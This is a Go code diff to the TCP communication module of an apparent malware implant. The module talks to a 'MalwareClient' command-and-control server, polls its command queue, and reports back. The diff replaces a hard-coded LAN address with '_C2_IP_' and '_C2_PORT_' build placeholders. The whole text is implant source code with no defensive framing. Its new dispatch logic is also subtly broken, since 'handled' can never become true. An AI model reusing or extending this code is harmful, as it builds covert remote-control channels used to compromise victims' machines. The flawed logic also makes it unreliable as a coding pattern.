@@ -40,15 +40,26 @@ func (settings settings) doConnection() {
 		return
 	}
 
-	fmt.Println(reply)
-	for _, module := range included_modules.Modules {
-		module.HandleMessage(reply, func(reply *messages.ImplantReply) {
-			client := pb.NewMalwareClient(settings.state.conn)
-			ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
-			defer cancel()
+	if reply.GetHeartbeat() != 0 {
+		return // Its a heartbeat so don't do anything
+	}
 
-			client.CheckCommandQueue(ctx, &messages.CheckCmdRequest{Message: &pb.CheckCmdRequest_Reply{Reply: reply}})
-		})
+	handled := false
+
+	callback := func(reply *messages.ImplantReply) {
+		client := pb.NewMalwareClient(settings.state.conn)
+		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
+		defer cancel()
+
+		client.CheckCommandQueue(ctx, &messages.CheckCmdRequest{Message: &pb.CheckCmdRequest_Reply{Reply: reply}})
+	}
+
+	for _, module := range included_modules.Modules {
+		handled = handled && module.HandleMessage(reply, callback)
+	}
+
+	if !handled {
+		callback(&messages.ImplantReply{Module: settings.ID(), Error: types.ERR_MODULE_NOT_IMPL})
 	}
 
 }
@@ -81,15 +92,13 @@ func (settings settings) listenServer() {
 	settings.state.conn.Close()
 }
 
-func (settings settings) HandleMessage(*messages.CheckCmdReply, func(*messages.ImplantReply)) {
-	// Empty stub
+func (settings settings) HandleMessage(*messages.CheckCmdReply, func(*messages.ImplantReply)) bool {
+	return false
 }
 
 func Create() types.Module {
-	// TODO: Replace with %C2_PORT%
-	// TODO: Replace with %C2_HOST%
-	port := int16(8000)
-	ip := "192.168.0.109"
+	port := int16(_C2_PORT_)
+	ip := "_C2_IP_"
 	state := state{}
 	host := fmt.Sprintf("%s:%d", ip, port)
 
@@ -106,4 +115,4 @@ func (settings settings) Shutdown() {
 	settings.state.running = false
 }
 
-func (settings) ID() string { return "Basic TCP Network" }
+func (settings) ID() string { return "basic_tcp" }
